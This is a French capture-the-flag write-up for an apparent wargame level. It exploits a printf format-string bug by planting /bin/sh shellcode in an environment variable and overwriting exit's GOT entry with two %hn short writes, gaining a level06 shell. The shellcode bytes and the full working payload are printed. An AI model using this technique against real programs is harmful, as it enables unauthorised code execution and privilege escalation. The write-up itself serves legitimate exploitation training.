# Level 05

Pour ce niveau on se retrouve encore une fois avec une vulnerabilite au niveau de `printf` cette fois ci le programme ne fait pas de `return` mais un `exit`

On va donc injecter un shellcode stocker dans une variable d'environnement puis ecraser l'adresse d'`exit` pour executer notre shellcode

```bash
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90" * 50 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```

```bash
(gdb) disas exit 
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

Recuperer l'adresse de notre shellcode grace a notre [petit programme](artifacts/getenv.c)
```bash
level05@OverRide:~$ /tmp/getenv SHELLCODE
0xffffd8c7
```

Trouvons l'offset de notre buffer en affichant les adresses dans la stack

```bash
level05@OverRide:~$ (python -c 'print "AAAA" + " %x " * 15') | ./level05 
aaaa 64  f7fcfac0  f7ec3b11  ffffd6af  ffffd6ae  0  ffffffff  ffffd734  f7fdb000  61616161  20782520  20782520  20782520  20782520  20782520
```

On peut voir qu'il se trouve a la 10eme position (le programme faisant une operation `XOR` sur chaque caractere avec la valeur 32 ils sont transformes en caractere miniscule)

Rajoutons un offset de `10` pour etre sur d'etre dans le `NOP Sled` donc notre adresse devient

```bash
➜ python                                                          
Python 3.10.12 (main, Jan  8 2026, 06:52:19) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(hex(0xffffd8c7 + 10))
0xffffd8d1
>>> 0xffffd8d1
4294957265
```

`4294957265 bytes` etant une valeur trop grande pour ecrire avec le format specifier `%n` on va faire un `short write` c'est a dire ecrire cette valeur en deux fois

```
0xd8d1  = 55505 (decimal)
55505 - 8 = 55497 <- premiere ecriture

0xffff = 65535 (decimal)
65535 - 55505 = 10030 <- deuxieme ecriture
```

Notre payload finale ressemble donc a:

```bash
level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55497x%10$hn" + "%10030x%11$hn"'; cat) | ./level05

whoami
level06
cat /home/users/level06/.pass
**************************************
```